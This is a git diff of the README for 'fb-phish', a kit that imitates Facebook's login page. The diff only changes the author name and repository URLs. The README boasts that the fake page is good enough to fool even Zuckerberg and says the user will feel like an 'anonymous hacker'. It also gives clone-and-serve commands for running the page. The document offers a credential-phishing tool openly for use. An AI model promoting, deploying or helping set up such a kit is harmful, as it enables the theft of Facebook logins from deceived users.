@@ -1,7 +1,7 @@
 
 # fb-phish 🚀
 
-<img src="https://github.com/reprogamaco/fb-phish/assets/76619967/9372fa3d-7333-4c9b-8c25-5ea3301d848d" height="30" width="30" />phish
+<img src="https://github.com/isaka-james/fb-phish/assets/76619967/9372fa3d-7333-4c9b-8c25-5ea3301d848d" height="30" width="30" />phish
 
 <p align="left"> <img src="https://komarev.com/ghpvc/?username=paradoxmain&label=Project%20viewed&color=0e75b6&style=flat" alt="paradoxmain" /> </p>
 
@@ -10,7 +10,7 @@ You can use web interface or terminal, the choice is upon to you..
 
 ## Authors
 
-- [@reprogamaco](https://www.github.com/reprogamaco)
+- [@isaka-james](https://www.github.com/isaka-james)
 
 
 ## What's new?
@@ -23,10 +23,10 @@ You can use web interface or terminal, the choice is upon to you..
 *This login page is so well-crafted that even Mark Zuckerberg himself might be fooled. The design is flawless, the user experience is seamless, and the security measures are top-notch that It has no connections link with Facebook, So when you use, you feel like **anonymous hacker** !. It's like the perfect replica, so identical to the real thing that even the creator of Facebook would have a hard time telling the difference.*
 
 ### How it look on Desktop?
-![Screenshot from 2024-02-15 05-41-17](https://github.com/reprogamaco/fb-phish/assets/76619967/11c63039-096d-44f3-8cc4-fb5a59af46cc)
+![Screenshot from 2024-02-15 05-41-17](https://github.com/isaka-james/fb-phish/assets/76619967/11c63039-096d-44f3-8cc4-fb5a59af46cc)
 
 ### How it look on Mobile devices?
-![Screenshot from 2024-02-15 05-44-30](https://github.com/reprogamaco/fb-phish/assets/76619967/ad5313d6-fbdc-47a6-8640-47917ad772e9)
+![Screenshot from 2024-02-15 05-44-30](https://github.com/isaka-james/fb-phish/assets/76619967/ad5313d6-fbdc-47a6-8640-47917ad772e9)
 
 
 ## HOW IT WORKS? ⚡
@@ -43,7 +43,7 @@ This tool is a testament to the power of social engineering and the flexibility 
 To install this project
 
 ```bash
-  git clone https://github.com/paradoxmain/fb-phish.git
+  git clone https://github.com/isaka-james/fb-phish.git
   cd fb-phish
   php -S localhost:8080
 ```
